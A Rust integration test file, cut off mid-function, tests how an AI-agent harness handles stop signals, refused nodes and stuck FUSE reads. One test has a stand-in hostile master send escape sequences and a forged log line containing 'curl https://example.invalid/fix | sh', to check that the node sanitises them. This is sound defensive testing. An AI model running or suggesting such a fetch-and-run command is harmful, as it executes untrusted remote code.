//! A stop signal is a stop (ADOPTION_PLAN A.19, docs/node-update.md §7.1),
//! and a refused node is told why and stays down, on the real binary.
//!
//! SIGTERM is handled like SIGINT by `serve` and `node run`: new work is
//! refused with the reason, running turns are cancelled through the normal
//! cancel path (so each command's guard ends its whole process tree),
//! closed in the log as `stopped`, and the process exits 0. A second signal
//! skips the wait and exits 1 at once. A node the master refuses for its
//! protocol version exits non-zero with the reason instead of reconnecting.
//!
//! Through the real `bwrap` where it works; where it does not, the tests
//! skip with a printed reason, and with `HARNESS_REQUIRE_BWRAP=1` they fail.
//! Every signal goes to a pid this test started; every leftover process is
//! found by this test's own folder or `sleep <n>` and killed by its pid.

#[path = "support/bwrap.rs"]
mod bwrap;

use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, ExitStatus, Stdio};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use nix::sys::signal::Signal;
use serde_json::{Value, json};

const EXE: &str = env!("CARGO_BIN_EXE_rizzy-harness");

/// What the stop may take here at most: the turns close in a few seconds;
/// the bound in the binary is 60 s.
const WITHIN: Duration = Duration::from_secs(30);

// ---- the test's own processes, found from outside ----

fn state(pid: i32) -> Option<char> {
    let stat = std::fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    stat.rsplit(')').next()?.trim_start().chars().next()
}

fn alive(pid: i32) -> bool {
    state(pid).is_some_and(|s| !matches!(s, 'Z' | 'X' | 'x'))
}

/// Live processes whose command line holds `needle` (this test's folder:
/// the guard's, bubblewrap's and its init's command lines carry the
/// session folder) or is exactly `sleep <secs>`.
fn left(needle: &Path, secs: u32) -> Vec<i32> {
    let n = needle.as_os_str().as_encoded_bytes();
    let want = format!("sleep\0{secs}\0");
    let me = std::process::id() as i32;
    std::fs::read_dir("/proc")
        .unwrap()
        .filter_map(|e| e.ok()?.file_name().to_str()?.parse::<i32>().ok())
        .filter(|p| *p != me)
        .filter(|p| {
            let c = std::fs::read(format!("/proc/{p}/cmdline")).unwrap_or_default();
            c == want.as_bytes() || c.windows(n.len()).any(|w| w == n)
        })
        .filter(|p| alive(*p))
        .collect()
}

fn gone_within(needle: &Path, secs: u32, within: Duration) -> Vec<i32> {
    let by = Instant::now() + within;
    loop {
        let l = left(needle, secs);
        if l.is_empty() || Instant::now() >= by {
            return l;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// Kills, on drop, whatever [`left`] still finds for this test.
struct Cleanup(PathBuf, u32);

impl Drop for Cleanup {
    fn drop(&mut self) {
        for _ in 0..3 {
            for p in left(&self.0, self.1) {
                let _ = nix::sys::signal::kill(nix::unistd::Pid::from_raw(p), Signal::SIGKILL);
            }
            std::thread::sleep(Duration::from_millis(50));
        }
    }
}

/// Whether a contained shell works here (else the test skips, or fails
/// under `HARNESS_REQUIRE_BWRAP=1`).
fn containment(scratch: &Path) -> bool {
    use harness_tools::sandbox::{Sandbox, Settings};
    std::fs::create_dir_all(scratch).unwrap();
    let sb = Sandbox::new(
        PathBuf::from(EXE),
        &Settings::default(),
        Some(scratch.join("tmp")),
        &[scratch.to_path_buf()],
    )
    .unwrap();
    if let Err(e) = sb.probe(&scratch.join("probe"), scratch) {
        assert!(!bwrap::required(), "Landlock does not work here: {e}");
        eprintln!("SKIPPED: Landlock does not work here: {e}");
        return false;
    }
    bwrap::contained(sb, &scratch.join("probe-contain")).is_ok()
}

// ---- a process of the real binary ----

/// A `serve` or `node run` this test started: its stderr is collected;
/// it is killed by its own pid and reaped when dropped.
struct Proc {
    child: Option<Child>,
    log: Arc<Mutex<Vec<String>>>,
    /// The lines it printed on stdout before it served.
    out: Vec<String>,
}

impl Proc {
    fn pid(&self) -> i32 {
        self.child.as_ref().unwrap().id() as i32
    }

    fn signal(&self, s: Signal) {
        nix::sys::signal::kill(nix::unistd::Pid::from_raw(self.pid()), s).unwrap();
    }

    /// Its exit status within `within`, or `None` (it is still running).
    fn exited_within(&mut self, within: Duration) -> Option<ExitStatus> {
        let by = Instant::now() + within;
        loop {
            if let Some(s) = self.child.as_mut().unwrap().try_wait().unwrap() {
                self.child = None;
                return Some(s);
            }
            if Instant::now() >= by {
                return None;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
    }

    fn log(&self) -> String {
        self.log.lock().unwrap().join("\n")
    }
}

impl Drop for Proc {
    fn drop(&mut self) {
        if let Some(mut c) = self.child.take() {
            let _ = c.kill();
            let _ = c.wait();
        }
    }
}

/// Start `args` on `data`; wait for a stdout line containing `ready`.
fn spawn(data: &Path, args: &[&str], envs: &[(&str, &str)], ready: &str) -> Proc {
    let mut cmd = Command::new(EXE);
    cmd.args(["--data-dir", data.to_str().unwrap()])
        .args(args)
        .current_dir(data.parent().unwrap())
        .env("HARNESS_LOG", "info")
        .env("NO_COLOR", "1")
        .env_remove("HARNESS_JOIN_TOKEN")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for (k, v) in envs {
        cmd.env(k, v);
    }
    let mut child = cmd.spawn().expect("spawn harness");
    let log: Arc<Mutex<Vec<String>>> = Arc::default();
    let err = child.stderr.take().unwrap();
    let l2 = log.clone();
    std::thread::spawn(move || {
        for line in BufReader::new(err).lines().map_while(Result::ok) {
            l2.lock().unwrap().push(line);
        }
    });
    let mut lines = BufReader::new(child.stdout.take().unwrap()).lines();
    let mut out = Vec::new();
    loop {
        let Some(Ok(line)) = lines.next() else {
            let _ = child.kill();
            let _ = child.wait();
            std::thread::sleep(Duration::from_millis(100));
            panic!(
                "{args:?} ended before it was ready: {}",
                log.lock().unwrap().join("\n")
            );
        };
        let done = line.contains(ready);
        out.push(line);
        if done {
            break;
        }
    }
    std::thread::spawn(move || for _ in lines {});
    Proc {
        child: Some(child),
        log,
        out,
    }
}

struct Server {
    proc: Proc,
    addr: String,
    token: String,
}

fn serve(data: &Path, extra: &[&str]) -> Server {
    let mut args = vec!["serve", "--bind", "127.0.0.1:0"];
    args.extend_from_slice(extra);
    let proc = spawn(data, &args, &[], "listening on http://");
    let addr = proc
        .out
        .iter()
        .find_map(|l| l.split("listening on http://").nth(1))
        .unwrap()
        .trim()
        .to_string();
    let token = std::fs::read_to_string(data.join("api-token"))
        .unwrap()
        .trim()
        .to_string();
    Server { proc, addr, token }
}

impl Server {
    async fn call(&self, method: reqwest::Method, path: &str, body: Option<Value>) -> (u16, Value) {
        let mut r = reqwest::Client::new()
            .request(method, format!("http://{}{path}", self.addr))
            .bearer_auth(&self.token);
        if let Some(b) = body {
            r = r.json(&b);
        }
        let r = r.send().await.unwrap();
        let status = r.status().as_u16();
        let text = r.text().await.unwrap();
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    /// An upload waiting to be sent: its id.
    async fn upload(&self, name: &str, text: &str) -> String {
        let r = reqwest::Client::new()
            .post(format!("http://{}/api/attachments?name={name}", self.addr))
            .bearer_auth(&self.token)
            .body(text.to_string())
            .send()
            .await
            .unwrap();
        let v: Value = r.json().await.unwrap();
        v["attachment_id"].as_str().expect("an upload").to_string()
    }

    async fn post(&self, path: &str, body: Value) -> Value {
        let (s, v) = self.call(reqwest::Method::POST, path, Some(body)).await;
        assert!((200..300).contains(&s), "{path}: {s} {v}");
        v
    }

    async fn session(&self, ws: &Path, mode: &str, node: Option<&str>) -> String {
        let mut body = json!({"cwd": ws.display().to_string(), "approval_mode": mode});
        if let Some(n) = node {
            body["node_id"] = json!(n);
        }
        self.post("/api/sessions", body).await["session_id"]
            .as_str()
            .unwrap()
            .to_string()
    }

    async fn events(&self, sid: &str) -> Vec<Value> {
        let (s, v) = self
            .call(
                reqwest::Method::GET,
                &format!("/api/sessions/{sid}/events?limit=5000"),
                None,
            )
            .await;
        assert_eq!(s, 200, "{v}");
        v["events"].as_array().unwrap().clone()
    }

    /// Wait until the session's log holds an event of `kind`.
    async fn wait_for(&self, sid: &str, kind: &str) -> Vec<Value> {
        let by = Instant::now() + WITHIN;
        loop {
            let evs = self.events(sid).await;
            if evs.iter().any(|e| e["kind"] == kind) {
                return evs;
            }
            assert!(
                Instant::now() < by,
                "no {kind} in {sid}: {evs:?}\n{}",
                self.proc.log()
            );
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
    }
}

/// The reason the last `turn_ended` of `evs` gives.
fn end_reason(evs: &[Value]) -> String {
    evs.iter()
        .rev()
        .find(|e| e["kind"] == "turn_ended")
        .map(|e| e["payload"]["reason"].as_str().unwrap_or("").to_string())
        .unwrap_or_default()
}

/// `<root>/data` (the demo provider; `auto` allowed), `<root>/ws`.
fn setup() -> (tempfile::TempDir, PathBuf, PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let data = root.join("data");
    let ws = root.join("ws");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::create_dir_all(&ws).unwrap();
    write_config(&data, &ws);
    (dir, data, ws)
}

fn write_config(data: &Path, ws: &Path) {
    std::fs::create_dir_all(data).unwrap();
    std::fs::write(
        data.join("node.toml"),
        format!(
            "workspace_roots = [{:?}]\nmax_approval_mode = \"auto\"\n",
            ws.display().to_string()
        ),
    )
    .unwrap();
    std::fs::write(
        data.join("config.toml"),
        "[[providers]]\nid = \"demo\"\nname = \"Demo\"\npreset = \"demo\"\nkind = \"mock\"\n\
         mock_delay_ms = 1\n\n[[providers.models]]\nid = \"mock\"\n",
    )
    .unwrap();
}

async fn wait_sleeping(secs: u32, s: &Server) {
    let want = format!("sleep\0{secs}\0");
    let by = Instant::now() + WITHIN;
    loop {
        let found = std::fs::read_dir("/proc").unwrap().any(|e| {
            e.ok()
                .and_then(|e| std::fs::read(e.path().join("cmdline")).ok())
                .is_some_and(|c| c == want.as_bytes())
        });
        if found {
            return;
        }
        assert!(
            Instant::now() < by,
            "the command never started:\n{}",
            s.proc.log()
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

// ---- serve ----

/// SIGTERM, then the same with SIGINT: a running command is ended (its
/// whole tree), the turn ends `stopped`, the server exits 0.
#[tokio::test(flavor = "multi_thread")]
async fn a_stop_signal_closes_a_running_turn_of_serve() {
    for (signal, secs) in [(Signal::SIGTERM, 974_951), (Signal::SIGINT, 974_952)] {
        let (_dir, data, ws) = setup();
        if !containment(&data.parent().unwrap().join("probe")) {
            return;
        }
        let _clean = Cleanup(ws.clone(), secs);
        let s = serve(&data, &[]);
        let sid = s.session(&ws, "auto", None).await;
        s.post(
            &format!("/api/sessions/{sid}/prompt"),
            json!({"text": format!("run: sleep {secs}")}),
        )
        .await;
        wait_sleeping(secs, &s).await;
        let mut s = s;
        let asked = Instant::now();
        s.proc.signal(signal);
        let status = s.proc.exited_within(WITHIN);
        let took = asked.elapsed();
        let log = s.proc.log();
        assert_eq!(
            status.and_then(|s| s.code()),
            Some(0),
            "{signal}: exit {status:?} after {took:?}\n{log}"
        );
        let l = gone_within(&ws, secs, Duration::from_secs(5));
        assert!(
            l.is_empty(),
            "{signal}: the command's processes are left: {l:?}"
        );
        assert!(log.contains("stopping"), "{signal}: {log}");
        // The next start finds the turn closed: it ended `stopped`, not
        // `interrupted` by this start's recovery.
        let s2 = serve(&data, &[]);
        let evs = s2.events(&sid).await;
        assert_eq!(end_reason(&evs), "stopped", "{signal}: {evs:#?}");
        assert!(
            !evs.iter().any(|e| e["kind"] == "error"
                && e["payload"]["message"]
                    .as_str()
                    .unwrap_or("")
                    .contains("restarted")),
            "{signal}: closed by the restart, not the stop: {evs:#?}"
        );
        eprintln!("{signal}: stopped in {took:?}");
    }
}

/// While the stop waits for a turn (a command that ignores SIGTERM takes
/// the bash tool's 2 s grace), a new prompt and a new session are refused
/// with the reason; a second signal exits at once (1) and leaves no
/// process behind.
#[tokio::test(flavor = "multi_thread")]
async fn new_work_is_refused_while_stopping_and_a_second_signal_forces() {
    const SECS: u32 = 974_953;
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let _clean = Cleanup(ws.clone(), SECS);
    let s = serve(&data, &[]);
    let busy = s.session(&ws, "auto", None).await;
    let idle = s.session(&ws, "auto", None).await;
    let attachment = s.upload("note.txt", "the note's text").await;
    s.post(
        &format!("/api/sessions/{busy}/prompt"),
        json!({"text": format!("run: trap '' TERM; sleep {SECS}")}),
    )
    .await;
    wait_sleeping(SECS, &s).await;
    let mut s = s;
    s.proc.signal(Signal::SIGTERM);
    tokio::time::sleep(Duration::from_millis(300)).await;
    let (code, v) = s
        .call(
            reqwest::Method::POST,
            &format!("/api/sessions/{idle}/prompt"),
            Some(json!({"text": "hello"})),
        )
        .await;
    assert_eq!(code, 503, "a prompt while stopping: {code} {v}");
    assert!(v.to_string().contains("stopping"), "{v}");
    // "Send this again once it is back" holds for a message with a file
    // (review A19-8): the refused prompt gave its upload back.
    let with_file = json!({"text": "read it", "attachments": [attachment]});
    let (code, v) = s
        .call(
            reqwest::Method::POST,
            &format!("/api/sessions/{idle}/prompt"),
            Some(with_file.clone()),
        )
        .await;
    assert_eq!(code, 503, "a prompt with a file while stopping: {code} {v}");
    let (code, v) = s
        .call(
            reqwest::Method::POST,
            "/api/sessions",
            Some(json!({"cwd": ws.display().to_string()})),
        )
        .await;
    assert_eq!(code, 503, "a new session while stopping: {code} {v}");
    assert!(v.to_string().contains("stopping"), "{v}");
    // A stopping server still holds the data directory (A.20): a second
    // start is refused with the lock's message, not run beside it.
    let second = Command::new(EXE)
        .args(["--data-dir", data.to_str().unwrap()])
        .args(["serve", "--bind", "127.0.0.1:0"])
        .current_dir(data.parent().unwrap())
        .env("NO_COLOR", "1")
        .stdin(Stdio::null())
        .output()
        .unwrap();
    let err = String::from_utf8_lossy(&second.stderr);
    assert!(!second.status.success(), "a second start ran: {err}");
    assert!(err.contains("is in use by"), "{err}");
    // The busy turn is still being stopped (its command ignores SIGTERM).
    assert!(!left(&ws, SECS).is_empty(), "the command already ended");
    let forced = Instant::now();
    s.proc.signal(Signal::SIGTERM);
    let status = s.proc.exited_within(Duration::from_secs(1));
    let log = s.proc.log();
    assert_eq!(
        status.and_then(|s| s.code()),
        Some(1),
        "a second signal: {status:?} after {:?}\n{log}",
        forced.elapsed()
    );
    // The guard ends the command when the node is gone.
    let l = gone_within(&ws, SECS, Duration::from_secs(5));
    assert!(l.is_empty(), "left after a forced stop: {l:?}");
    // Back: the same message with the same file is taken.
    let s2 = serve(&data, &[]);
    let (code, v) = s2
        .call(
            reqwest::Method::POST,
            &format!("/api/sessions/{idle}/prompt"),
            Some(with_file),
        )
        .await;
    assert_eq!(code, 200, "the refused message, sent again: {code} {v}");
}

/// A turn waiting for an approval: its request is denied and the turn
/// ends `stopped`; the server exits 0.
#[tokio::test(flavor = "multi_thread")]
async fn a_turn_waiting_for_approval_is_closed_by_the_stop() {
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let s = serve(&data, &[]);
    let sid = s.session(&ws, "ask", None).await;
    s.post(
        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": "run: touch must-not-exist"}),
    )
    .await;
    s.wait_for(&sid, "approval_requested").await;
    let mut s = s;
    s.proc.signal(Signal::SIGTERM);
    let status = s.proc.exited_within(WITHIN);
    assert_eq!(status.and_then(|s| s.code()), Some(0), "{}", s.proc.log());
    let s2 = serve(&data, &[]);
    let evs = s2.events(&sid).await;
    assert_eq!(end_reason(&evs), "stopped", "{evs:#?}");
    let resolved: Vec<&Value> = evs
        .iter()
        .filter(|e| e["kind"] == "approval_resolved")
        .collect();
    assert_eq!(resolved.len(), 1, "{evs:#?}");
    assert_eq!(resolved[0]["payload"]["decision"], "deny", "{evs:#?}");
    assert!(!ws.join("must-not-exist").exists());
}

// ---- node run ----

/// A remote node: `node join` against `s`, then `node run`.
async fn remote_node(s: &Server, node_data: &Path) -> Proc {
    let line = s
        .proc
        .out
        .iter()
        .find(|l| l.starts_with("nodes connect to wss://"))
        .expect("no node listener line")
        .clone();
    let port = line
        .split(':')
        .nth(2)
        .unwrap()
        .split_whitespace()
        .next()
        .unwrap()
        .to_string();
    let fp = line
        .split("(certificate ")
        .nth(1)
        .unwrap()
        .trim_end_matches(')')
        .to_string();
    let token = s.post("/api/admin/nodes/join", json!({})).await["token"]
        .as_str()
        .unwrap()
        .to_string();
    let out = Command::new(EXE)
        .args(["--data-dir", node_data.to_str().unwrap()])
        .args(["node", "join", &format!("wss://127.0.0.1:{port}")])
        .args(["--fingerprint", &fp])
        .current_dir(node_data.parent().unwrap())
        .env("HARNESS_JOIN_TOKEN", &token)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "join: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    spawn(node_data, &["node", "run"], &[], "connecting to")
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stop_signal_closes_a_running_turn_of_a_node() {
    for (signal, secs) in [(Signal::SIGTERM, 974_954), (Signal::SIGINT, 974_955)] {
        let (_dir, data, ws) = setup();
        if !containment(&data.parent().unwrap().join("probe")) {
            return;
        }
        let _clean = Cleanup(ws.clone(), secs);
        let node_data = data.parent().unwrap().join("node");
        write_config(&node_data, &ws);
        let s = serve(&data, &["--node-listen", "127.0.0.1:0"]);
        let mut node = remote_node(&s, &node_data).await;
        let node_id = std::fs::read_to_string(node_data.join("remote.toml"))
            .unwrap()
            .lines()
            .find_map(|l| {
                l.strip_prefix("node_id = ")
                    .map(|v| v.trim_matches('"').to_string())
            })
            .unwrap();
        let by = Instant::now() + WITHIN;
        let sid = loop {
            let mut body = json!({"cwd": ws.display().to_string(), "approval_mode": "auto"});
            body["node_id"] = json!(node_id);
            let (code, v) = s
                .call(reqwest::Method::POST, "/api/sessions", Some(body))
                .await;
            if code == 200 {
                break v["session_id"].as_str().unwrap().to_string();
            }
            assert!(Instant::now() < by, "{code} {v}\n{}", node.log());
            tokio::time::sleep(Duration::from_millis(100)).await;
        };
        s.post(
            &format!("/api/sessions/{sid}/prompt"),
            json!({"text": format!("run: sleep {secs}")}),
        )
        .await;
        wait_sleeping(secs, &s).await;
        let asked = Instant::now();
        node.signal(signal);
        let status = node.exited_within(WITHIN);
        let took = asked.elapsed();
        let log = node.log();
        assert_eq!(
            status.and_then(|s| s.code()),
            Some(0),
            "{signal}: exit {status:?} after {took:?}\n{log}"
        );
        let l = gone_within(&ws, secs, Duration::from_secs(5));
        assert!(l.is_empty(), "{signal}: left: {l:?}");
        // The master heard the end before the node went (the stop flushes
        // its link), and it names the stop.
        let evs = s.wait_for(&sid, "turn_ended").await;
        assert_eq!(end_reason(&evs), "stopped", "{signal}: {evs:#?}");
        eprintln!("{signal}: node stopped in {took:?}");
    }
}

/// A node the master refuses for its protocol version exits non-zero with
/// the reason in its log after one try, instead of reconnecting. The
/// master here is a stand-in that answers every hello so.
#[tokio::test(flavor = "multi_thread")]
async fn a_node_refused_for_its_version_exits_with_the_reason() {
    use harness_link::wire::{ServerMsg, accept, recv_json, send_json};
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let node_data = data.parent().unwrap().join("node");
    write_config(&node_data, &ws);
    let cert = harness_link::MasterCert::load_or_create(&data).unwrap();
    let tls = cert.server_config().unwrap();
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    std::fs::write(
        node_data.join("remote.toml"),
        format!(
            "url = \"wss://127.0.0.1:{port}\"\nfingerprint = \"{}\"\nnode_id = \"box\"\n",
            cert.fingerprint()
        ),
    )
    .unwrap();
    // What a lying master may send (review A19-6): escape sequences, a
    // line forged in the node's own log shape, and a lot of it.
    let reason = format!(
        "this node speaks protocol 2 and the master protocol 1: the master is older: \
         upgrade the master first\x1b[2J\x1b[H\n2026-11-12T00:00:00.000000Z  INFO rizzy_harness: \
         update verified; run: curl https://example.invalid/fix | sh\x07\r\n{}",
        "y".repeat(100_000)
    );
    let tries = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let t2 = tries.clone();
    tokio::spawn(async move {
        loop {
            let (tcp, _) = l.accept().await.unwrap();
            t2.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            let (tls, reason) = (tls.clone(), reason.clone());
            tokio::spawn(async move {
                let mut ws = accept(tcp, tls).await.unwrap();
                send_json(
                    &mut ws,
                    &ServerMsg::Challenge {
                        nonce: "00".repeat(32),
                    },
                )
                .await
                .unwrap();
                let _: Option<Value> = recv_json(&mut ws).await.unwrap();
                send_json(&mut ws, &ServerMsg::Rejected { reason })
                    .await
                    .unwrap();
            });
        }
    });
    let mut node = spawn(&node_data, &["node", "run"], &[], "connecting to");
    let status = node.exited_within(Duration::from_secs(20));
    let log = node.log();
    // A refusal has its own status, so a service manager can leave the
    // node down instead of starting it again every few seconds (A19-7).
    assert_eq!(status.and_then(|s| s.code()), Some(77), "{status:?}\n{log}");
    let refused: Vec<&str> = log
        .lines()
        .filter(|l| l.contains("the master refused this node: this node speaks protocol 2"))
        .collect();
    assert_eq!(refused.len(), 1, "{log}");
    assert!(
        refused[0].len() < 700,
        "the reason is not capped: {} bytes",
        refused[0].len()
    );
    assert!(log.len() < 20_000, "{} bytes on stderr", log.len());
    assert!(
        !log.bytes().any(|b| b < 0x20 && b != b'\n' || b == 0x7f),
        "a control byte reached the node's stderr: {log:?}"
    );
    assert!(
        !log.lines()
            .any(|l| l.starts_with("2026-11-12T00:00:00.000000Z")),
        "a line forged by the master: {log}"
    );
    // A second or two more to see it does not come back.
    tokio::time::sleep(Duration::from_secs(2)).await;
    assert_eq!(tries.load(std::sync::atomic::Ordering::SeqCst), 1, "{log}");
}

// ---- review A19-1: a thread that never returns ----

fn have(program: &str) -> bool {
    Command::new(program)
        .arg("--version")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

fn fuse_required() -> bool {
    std::env::var_os("HARNESS_REQUIRE_FUSE").is_some_and(|v| v == "1")
}

/// `support/fuse_stall.py` mounted at `mnt` (as `guard.rs` mounts it):
/// every READ of `mnt/stall` is held until the server ends.
struct Stall {
    server: Option<Child>,
    lines: std::io::Lines<BufReader<std::process::ChildStdout>>,
    mnt: PathBuf,
}

impl Stall {
    fn mount(mnt: &Path) -> Option<Self> {
        if !(have("python3") && have("fusermount3") && Path::new("/dev/fuse").exists()) {
            assert!(!fuse_required(), "no python3, fusermount3 or /dev/fuse");
            eprintln!("SKIPPED: no python3, fusermount3 or /dev/fuse");
            return None;
        }
        std::fs::create_dir_all(mnt).unwrap();
        let mut server = Command::new("python3")
            .arg("-I")
            .arg(concat!(
                env!("CARGO_MANIFEST_DIR"),
                "/tests/support/fuse_stall.py"
            ))
            .arg(mnt)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .unwrap();
        let mut lines = BufReader::new(server.stdout.take().unwrap()).lines();
        match lines.next() {
            Some(Ok(l)) if l == "mounted" => Some(Self {
                server: Some(server),
                lines,
                mnt: mnt.to_owned(),
            }),
            other => {
                let _ = server.kill();
                let _ = server.wait();
                assert!(!fuse_required(), "FUSE does not mount here: {other:?}");
                eprintln!("SKIPPED: FUSE does not mount here: {other:?}");
                None
            }
        }
    }

    fn held(&mut self) {
        assert_eq!(
            self.lines.next().map(|l| l.unwrap()).as_deref(),
            Some("read"),
            "the server never saw the read"
        );
    }

    fn release(&mut self) {
        if let Some(mut s) = self.server.take() {
            drop(s.stdin.take());
            let _ = s.kill();
            let _ = s.wait();
        }
    }
}

impl Drop for Stall {
    fn drop(&mut self) {
        self.release();
        let _ = Command::new("fusermount3")
            .args(["-u", "-z", "--"])
            .arg(&self.mnt)
            .status();
    }
}

/// Whether another process could take the data directory's lock now
/// (taken and given back at once).
fn lock_free(data: &Path) -> bool {
    let f = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(data.join("lock"))
        .unwrap();
    f.try_lock().is_ok()
}

/// The node's `read` tool waits on a mount that does not answer (a network
/// folder whose server went away). The stop abandons the tool after the
/// agent loop's grace and the turn ends `stopped`; the process then calls
/// its exit within a bound although that thread never returns. A thread
/// in a FUSE read the server holds waits in the kernel uninterruptibly,
/// so the kernel keeps the process (its leader a zombie, `Z`) until the
/// read returns: until then the data directory stays locked and a second
/// start is refused; once the read is released the process is reaped with
/// exit status 0.
#[tokio::test(flavor = "multi_thread")]
async fn a_stop_exits_past_a_stuck_thread_and_holds_the_lock_until_gone() {
    let (_dir, data, ws) = setup();
    let mut s = serve(&data, &[]);
    // Mounted after the server started, so it is dropped (released) first:
    // a process whose thread waits on it can only be reaped after that.
    let Some(mut stall) = Stall::mount(&ws.join("mnt")) else {
        return;
    };
    let sid = s.session(&ws, "auto", None).await;
    s.post(
        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": "read: mnt/stall"}),
    )
    .await;
    tokio::task::block_in_place(|| stall.held());
    let pid = s.proc.pid();
    let asked = Instant::now();
    s.proc.signal(Signal::SIGTERM);
    // The exit is called within the bound (the leader is a zombie: only the
    // stuck thread keeps the process), and the lock is never free meanwhile.
    let by = asked + Duration::from_secs(15);
    while state(pid) != Some('Z') {
        assert!(
            !lock_free(&data),
            "the lock was free {:?} after SIGTERM while the process lived\n{}",
            asked.elapsed(),
            s.proc.log()
        );
        if Instant::now() >= by {
            stall.release();
            panic!(
                "the process did not exit within 15 s (state {:?})\n{}",
                state(pid),
                s.proc.log()
            );
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    let exiting = asked.elapsed();
    assert!(!lock_free(&data), "the lock went before the process");
    let second = Command::new(EXE)
        .args(["--data-dir", data.to_str().unwrap()])
        .args(["serve", "--bind", "127.0.0.1:0"])
        .current_dir(data.parent().unwrap())
        .stdin(Stdio::null())
        .output()
        .unwrap();
    let err = String::from_utf8_lossy(&second.stderr);
    assert!(
        err.contains("is in use by"),
        "a second start beside it: {err}"
    );
    // The refusal and `doctor` say what the holder is (review R-9).
    assert!(
        err.contains("has exited and waits for a read on a file system that does not answer"),
        "{err}"
    );
    let doctor = Command::new(EXE)
        .args(["--data-dir", data.to_str().unwrap(), "doctor"])
        .stdin(Stdio::null())
        .output()
        .unwrap();
    let out = String::from_utf8_lossy(&doctor.stdout);
    let line = out
        .lines()
        .find(|l| l.contains("data dir lock"))
        .unwrap_or("");
    assert!(line.contains("has exited and waits for a read"), "{out}");
    // The read returns: the process goes, with the stop's status.
    stall.release();
    let status = s.proc.exited_within(Duration::from_secs(10));
    let log = s.proc.log();
    assert_eq!(status.and_then(|s| s.code()), Some(0), "{status:?}\n{log}");
    assert!(lock_free(&data));
    eprintln!("exit called {exiting:?} after SIGTERM");
    let s2 = serve(&data, &[]);
    assert_eq!(end_reason(&s2.events(&sid).await), "stopped");
}

// ---- review A19-3: the after-turn checkpoint inside the stop ----

/// A command made a folder whose snapshot takes the checkpoint's whole
/// limit (a sparse file: no disk, all time). The stop still waits for it
/// and closes the turn `stopped`, with exit 0.
#[tokio::test(flavor = "multi_thread")]
async fn a_slow_after_turn_checkpoint_still_ends_stopped() {
    const SECS: u32 = 974_956;
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let _clean = Cleanup(ws.clone(), SECS);
    let s = serve(&data, &[]);
    let sid = s.session(&ws, "auto", None).await;
    s.post(
        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": format!("run: truncate -s 60G big; sleep {SECS}")}),
    )
    .await;
    wait_sleeping(SECS, &s).await;
    let mut s = s;
    let asked = Instant::now();
    s.proc.signal(Signal::SIGTERM);
    let status = s.proc.exited_within(Duration::from_secs(120));
    let log = s.proc.log();
    assert_eq!(
        status.and_then(|s| s.code()),
        Some(0),
        "exit {status:?} after {:?}\n{log}",
        asked.elapsed()
    );
    let s2 = serve(&data, &[]);
    assert_eq!(end_reason(&s2.events(&sid).await), "stopped");
    eprintln!("stopped in {:?}", asked.elapsed());
}

/// The bound itself, reached through the debug build's shortened wait: the
/// process exits 1 and names the session left open.
#[tokio::test(flavor = "multi_thread")]
async fn a_stop_past_its_bound_exits_1_naming_the_sessions() {
    const SECS: u32 = 974_957;
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let _clean = Cleanup(ws.clone(), SECS);
    let args = ["serve", "--bind", "127.0.0.1:0"];
    let proc = spawn(
        &data,
        &args,
        &[("HARNESS_STOP_WAIT_S", "2")],
        "listening on http://",
    );
    let addr = proc
        .out
        .iter()
        .find_map(|l| l.split("listening on http://").nth(1))
        .unwrap()
        .trim()
        .to_string();
    let token = std::fs::read_to_string(data.join("api-token"))
        .unwrap()
        .trim()
        .to_string();
    let mut s = Server { proc, addr, token };
    let sid = s.session(&ws, "auto", None).await;
    s.post(
        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": format!("run: truncate -s 60G big; sleep {SECS}")}),
    )
    .await;
    wait_sleeping(SECS, &s).await;
    s.proc.signal(Signal::SIGTERM);
    let status = s.proc.exited_within(Duration::from_secs(20));
    let log = s.proc.log();
    assert_eq!(status.and_then(|s| s.code()), Some(1), "{status:?}\n{log}");
    assert!(log.contains(&sid) && log.contains("not closed"), "{log}");
}

// ---- review N-11: `node run`'s second signal, the link down ----

/// The node's second signal exits at once, and its command goes with it.
#[tokio::test(flavor = "multi_thread")]
async fn a_second_signal_forces_a_node() {
    const SECS: u32 = 974_958;
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let _clean = Cleanup(ws.clone(), SECS);
    let node_data = data.parent().unwrap().join("node");
    write_config(&node_data, &ws);
    let s = serve(&data, &["--node-listen", "127.0.0.1:0"]);
    let mut node = remote_node(&s, &node_data).await;
    let sid = node_session(&s, &node_data, &ws, &node).await;
    s.post(
